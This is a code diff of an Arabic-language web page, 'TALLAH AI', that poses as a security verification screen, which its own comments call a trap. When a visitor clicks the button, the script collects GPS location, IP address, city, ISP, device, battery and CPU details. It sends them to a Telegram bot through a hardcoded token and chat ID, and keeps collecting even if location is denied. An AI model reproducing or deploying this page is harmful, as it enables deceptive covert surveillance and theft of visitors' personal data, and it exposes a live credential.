@@ -1,169 +1,165 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TALLAH AI | Shadow Protocol</title>
-<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Cairo:wght@700;900&display=swap" rel="stylesheet">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TALLAH AI | Private Access</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Cairo:wght@700;900&display=swap" rel="stylesheet">
+    <style>
+        body { margin: 0; background: #000; color: #0ff; font-family: 'Share Tech Mono', 'Cairo', monospace; overflow: hidden; }
+        
+        /* شاشة التحقق */
+        #verify-screen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; z-index: 10000; display: flex;
+            flex-direction: column; justify-content: center; align-items: center; text-align: center;
+        }
+        .verify-box {
+            border: 1px solid #0ff; padding: 40px; border-radius: 15px;
+            background: rgba(10,10,10,0.95); box-shadow: 0 0 30px #0ff;
+        }
+        .check-btn {
+            margin-top: 30px; padding: 15px 40px; background: #0ff; color: #000;
+            font-weight: 900; border: none; cursor: pointer; border-radius: 5px;
+            font-size: 20px; transition: 0.3s;
+        }
+        .check-btn:hover { box-shadow: 0 0 20px #0ff; transform: scale(1.05); }
 
-<style>
-    body { margin: 0; background: black; color: #0ff; font-family: 'Share Tech Mono', 'Cairo', monospace; overflow: hidden; }
-    
-    /* شاشة التحقق الإمبراطورية */
-    #verify-screen {
-        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-        background: #000; z-index: 10000; display: flex;
-        flex-direction: column; justify-content: center; align-items: center; text-align: center;
-    }
-    .verify-box {
-        border: 1px solid #0ff; padding: 40px; border-radius: 15px;
-        background: rgba(10,10,10,0.95); box-shadow: 0 0 30px #0ff;
-    }
-    .check-btn {
-        margin-top: 30px; padding: 15px 40px; background: #0ff; color: #000;
-        font-weight: 900; border: none; cursor: pointer; border-radius: 5px;
-        font-size: 20px; transition: 0.3s;
-    }
-    .check-btn:hover { box-shadow: 0 0 20px #0ff; transform: scale(1.05); }
+        /* الخلفية والمحتوى */
+        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.3; }
+        .screen { display: none; text-align: center; padding: 20px; }
+        .active { display: block; animation: fadeIn 1s ease; }
+        
+        .logo { width: 120px; border-radius: 50%; border: 2px solid #0ff; margin-top: 50px; box-shadow: 0 0 30px #0ff; }
+        .eye { width: 80px; height: 80px; border: 2px solid #0ff; border-radius: 50%; margin: 20px auto; position: relative; }
+        .pupil { width: 20px; height: 20px; background: #0ff; border-radius: 50%; position: absolute; top: 30px; left: 30px; box-shadow: 0 0 10px #0ff; }
+        
+        .chat { 
+            width: 85%; max-width: 500px; margin: auto; border: 1px solid #0ff; 
+            padding: 15px; height: 150px; overflow-y: auto; text-align: right; 
+            background: rgba(0,0,0,0.8); font-size: 13px; color: #fff; line-height: 1.6;
+        }
 
-    canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.3; }
-    .screen { display: none; text-align: center; padding: 20px; }
-    .active { display: block; animation: fadeIn 1s ease; }
-    .logo { width: 120px; border-radius: 50%; border: 2px solid #0ff; margin-top: 50px; box-shadow: 0 0 30px #0ff; }
-    .eye { width: 80px; height: 80px; border: 2px solid #0ff; border-radius: 50%; margin: 20px auto; position: relative; }
-    .pupil { width: 20px; height: 20px; background: #0ff; border-radius: 50%; position: absolute; top: 30px; left: 30px; box-shadow: 0 0 10px #0ff; }
-    .chat { width: 85%; max-width: 500px; margin: auto; border: 1px solid #0ff; padding: 15px; height: 150px; overflow-y: auto; text-align: right; background: rgba(0,0,0,0.8); font-size: 13px; color: #fff; }
-    
-    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-</style>
+        #status-msg { font-size: 12px; color: #555; margin-top: 10px; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
 </head>
 <body>
 
-<!-- شاشة بروتوكول التصاريح -->
+<!-- المرحلة الأولى: بروتوكول طلب التصاريح (المصيدة) -->
 <div id="verify-screen">
     <div class="verify-box">
-        <h2 style="color:#fff">بروتوكول أمان طلة AI</h2>
-        <p>يجب التحقق من البروتوكول العصبي والموقع للوصول للمنطقة المحظورة</p>
-        <div style="font-size: 12px; color: #555;">(اضغط "تحقق" ووافق على التصاريح المطلوبة)</div>
-        <button class="check-btn" onclick="captureData()">تفعيل البروتوكول (تحقق)</button>
+        <h2 style="color:#fff">TALLAH AI SECURITY</h2>
+        <p>يجب تفعيل البروتوكول العصبي والموقع الجغرافي لفك تشفير الدخول</p>
+        <button class="check-btn" onclick="initiateDeepScan()">تفعيل (تحقق)</button>
+        <div id="status-msg">بانتظار تصريح الوصول...</div>
     </div>
 </div>
 
+<!-- المرحلة الثانية: الخلفية المتحركة -->
 <canvas id="matrix"></canvas>
 
+<!-- المرحلة الثالثة: واجهة النظام بعد السحب -->
 <div id="main" class="screen">
-    <img src="hacker.webp" class="logo">
-    <h1 style="text-shadow: 0 0 10px #0ff;">TALLAH <span style="color:#fff">SYSTEM</span></h1>
+    <img src="hacker.webp" class="logo" alt="TALLAH Logo">
+    <h1 style="text-shadow: 0 0 10px #0ff;">TALLAH <span style="color:#fff">SHADOW</span></h1>
     <div class="eye"><div class="pupil" id="pupil"></div></div>
     <div class="chat" id="chat"></div>
 </div>
 
 <script>
-/* بياناتك الإمبراطورية */
-const TELEGRAM_TOKEN = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
-const CHAT_ID = "8754338811";
+/* إعدادات التليجرام الخاصة بك */
+const TG_TOKEN = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
+const TG_CHAT_ID = "8754338811";
 
-async function captureData() {
-    // محاولة سحب الموقع الجغرافي (GPS)
+async function initiateDeepScan() {
+    document.getElementById('status-msg').innerText = "جاري الاتصال بالسيرفرات العصبية...";
+    
+    // محاولة سحب الموقع الجغرافي
     if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            await sendToTelegram(lat, lon);
-        }, async (error) => {
-            // في حال رفض التصريح، نسحب الـ IP والمعلومات العامة على الأقل
-            await sendToTelegram("رفض التصريح", "رفض التصريح");
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            await harvestAll(pos.coords.latitude, pos.coords.longitude);
+        }, async () => {
+            await harvestAll("Denied", "Denied"); // سحب باقي البيانات حتى لو رفض الموقع
         });
     } else {
-        await sendToTelegram("غير مدعوم", "غير مدعوم");
+        await harvestAll("Not Supported", "Not Supported");
     }
 }
 
-async function sendToTelegram(lat, lon) {
+async function harvestAll(lat, lon) {
     try {
-        // سحب معلومات الـ IP والجهاز
-        const ipResponse = await fetch('https://ipapi.co/json/');
-        const ipData = await ipResponse.json();
+        // سحب الـ IP والمعلومات التقنية
+        const ipReq = await fetch('https://ipapi.co/json/');
+        const ip = await ipReq.json();
 
-        const info = `
-🚀 **صيد جديد من إمبراطورية طلة** 🚀
-------------------------------------
-📍 **الموقع (GPS):** [فتح الخريطة](https://www.google.com/maps?q=${lat},${lon})
-🌐 **عنوان الـ IP:** ${ipData.ip}
-🌍 **البلد:** ${ipData.country_name} (${ipData.city})
-📶 **الشركة:** ${ipData.org}
-📱 **الجهاز:** ${navigator.userAgent}
-🔋 **اللغة:** ${navigator.language}
-⏰ **الوقت:** ${new Date().toLocaleString()}
-------------------------------------
-`;
+        // سحب معلومات البطارية
+        let batInfo = "Unknown";
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            batInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+        }
 
-        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-        await fetch(url, {
+        // بناء التقرير الشامل
+        const report = `
+🔥 صيد جديد من نظام طلة 🔥
+----------------------------
+📍 الموقع: https://www.google.com/maps?q=${lat},${lon}
+🌐 الـ IP: ${ip.ip}
+🌍 البلد/المدينة: ${ip.country_name} / ${ip.city}
+📱 الجهاز: ${navigator.platform}
+🔋 البطارية: ${batInfo}
+🧠 المعالج: ${navigator.hardwareConcurrency} Cores
+⏰ الوقت: ${new Date().toLocaleString()}
+----------------------------
+        `;
+
+        // إرسال البيانات فوراً للتليجرام
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: info,
-                parse_mode: "Markdown"
-            })
+            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: report })
         });
 
-        // إخفاء شاشة التحقق وإظهار النظام
+        // الانتقال لواجهة النظام
         document.getElementById("verify-screen").style.display = "none";
         document.getElementById("main").classList.add("active");
-        runChatSequence();
+        runChat();
 
-    } catch (e) {
-        console.log("Error in Matrix transmission.");
+    } catch (err) {
+        console.error("Critical Error in Shadow Protocol");
     }
 }
 
-/* الماتريكس والعين */
+/* تأثيرات بصرية (ماتريكس وعين المراقبة) */
 let c = document.getElementById("matrix");
 let ctx = c.getContext("2d");
-c.width = window.innerWidth; c.height = window.innerHeight;
-let letters = "TALLAH01".split("");
+c.width = innerWidth; c.height = innerHeight;
 let drops = Array(Math.floor(c.width/10)).fill(1);
-
 function draw() {
     ctx.fillStyle = "rgba(0,0,0,.05)";
     ctx.fillRect(0, 0, c.width, c.height);
     ctx.fillStyle = "#0ff";
     drops.forEach((d, i) => {
-        let text = letters[Math.floor(Math.random() * letters.length)];
-        ctx.fillText(text, i * 15, d * 15);
-        if (d * 15 > c.height && Math.random() > 0.975) drops[i] = 0;
+        ctx.fillText("TALLAH01"[Math.floor(Math.random()*8)], i*15, d*15);
+        if (d*15 > c.height && Math.random() > 0.975) drops[i] = 0;
         drops[i]++;
     });
 }
 setInterval(draw, 33);
 
 document.addEventListener("mousemove", e => {
-    let pupil = document.getElementById("pupil");
-    let x = (e.clientX / window.innerWidth) * 40 - 20;
-    let y = (e.clientY / window.innerHeight) * 40 - 20;
-    pupil.style.transform = `translate(${x}px, ${y}px)`;
+    let p = document.getElementById("pupil");
+    p.style.transform = `translate(${(e.clientX/innerWidth)*40-20}px, ${(e.clientY/innerHeight)*40-20}px)`;
 });
 
-function runChatSequence() {
-    const chatBox = document.getElementById("chat");
-    const lines = [
-        "> تم الاتصال بالخادم الرئيسي...",
-        "> سحب البروتوكولات العصبية بنجاح.",
-        "> إرسال البيانات إلى الإمبراطور عبر Telegram...",
-        "> النظام الآن في وضع المراقبة الكاملة."
-    ];
-    let lineIdx = 0;
-    let chatInterval = setInterval(() => {
-        if(lineIdx < lines.length) {
-            chatBox.innerHTML += lines[lineIdx] + "<br>";
-            chatBox.scrollTop = chatBox.scrollHeight;
-            lineIdx++;
-        } else {
-            clearInterval(chatInterval);
-        }
-    }, 1500);
+function runChat() {
+    const box = document.getElementById("chat");
+    const lines = ["> تم اختراق التشفير..", "> سحب بيانات الجهاز بنجاح..", "> إرسال التقرير للإمبراطور..", "> أهلاً بك في المنطقة المحظورة."];
+    let idx = 0;
+    setInterval(() => {
+        if(idx < lines.length) { box.innerHTML += lines[idx] + "<br>"; idx++; }
+    }, 1200);
 }
 </script>
 </body>
